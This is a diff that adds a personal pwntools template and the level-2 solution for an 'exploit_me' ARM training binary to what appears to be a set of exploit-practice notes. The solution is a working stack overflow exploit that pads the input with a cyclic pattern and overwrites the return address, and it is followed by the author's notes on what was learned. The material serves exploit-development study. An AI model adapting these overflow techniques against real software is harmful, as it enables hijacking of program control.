@@ -498,5 +498,123 @@ python exploit.py REMOTE     # against the remote host
 
 
 
+# personal pwntools template
+
+```
+#!/home/dvader/tools/pwntools/bin/python3
+
+from pwn import *
+
+context(arch='arm', bits=32, endian='little')
+''' ### enter tmux before running ### '''
+context.terminal = ["tmux", "splitw", "-h"]
+
+#username = b'\x41'*12
+#username = cyclic(32)
+username = cyclic(cyclic_find(0x61616164))
+#username += b'\x90' * 4
+target_address = p32(0x112d4)
+target_address.rstrip(b'\x00')
+username += target_address
+
+password = 'password'
+binary_args = ['/home/dvader/exploit_me/bin/exploit', 'help', username, password]
+
+gdb_commands = '''
+set debuginfod enabled off
+set exec-wrapper env -i
+b *0x1160c
+continue
+'''
+
+context.gdb_binary = "/usr/local/bin/pwndbg"
+io = gdb.debug(binary_args, gdbscript=gdb_commands)
+
+if args.INTERACTIVE:
+    io.interactive()
+else:
+    print(io.recvall(timeout=1))
+
+
+''' Learned (LX) '''
+
+# L0 - 
+# L1 - 
+# L2 - 
+
+
+''' Remembered (RX) '''
+
+# R0 - 
+
+
+''' To Do (TX) '''
+
+# T0 - 
+
+```
+
+
+# exploit_me ARM binary - level 2:
+```
+#!/home/dvader/tools/pwntools/bin/python3
+
+from pwn import *
+
+context(arch='arm', bits=32, endian='little')
+''' ### enter tmux before running ### '''
+context.terminal = ["tmux", "splitw", "-h"]
+
+#username = b'\x41'*12
+username = cyclic(cyclic_find(0x61616164))
+#username += b'\x90' * 4
+target_address = p32(0x112d4)
+target_address.rstrip(b'\x00')
+print(target_address)
+username += target_address
+
+password = 'password'
+binary_args = ['/home/dvader/exploit_me/bin/exploit', 'help', username, password]
+
+gdb_commands = '''
+set debuginfod enabled off
+set exec-wrapper env -i
+b *0x1160c
+continue
+'''
+
+context.gdb_binary = "/usr/local/bin/pwndbg"
+io = gdb.debug(binary_args, gdbscript=gdb_commands)
+
+if args.INTERACTIVE:
+    io.interactive()
+else:
+    print(io.recvall(timeout=1))
+
+#binary = ELF('../exploit')
+
+
+''' Learned (LX) '''
+# can't add additional bytes in the buffer due to the null byte trick for the target address
+# username += cyclic(33)
+# L0 - learned that luckily since the target address is the last thing we're sending via our buffer,
+# we can leverage the null byte trick/rstrip to strip the null byte from the original 000112d4 target address
+
+# L1 - learned in ghidra there was a function to jump to that ghidra didn't disassemble correctly
+# L2 - learned to use ghidra's "Create Function" to fixup the incorrect disassembly
+
+
+''' Remembered (RX) '''
+# R0 - remembered some of the other calls like recvall() to wait for exploit to run and finish
+
+
+''' To Do (TX) '''
+
+
+```
+
+
+
+
 
 
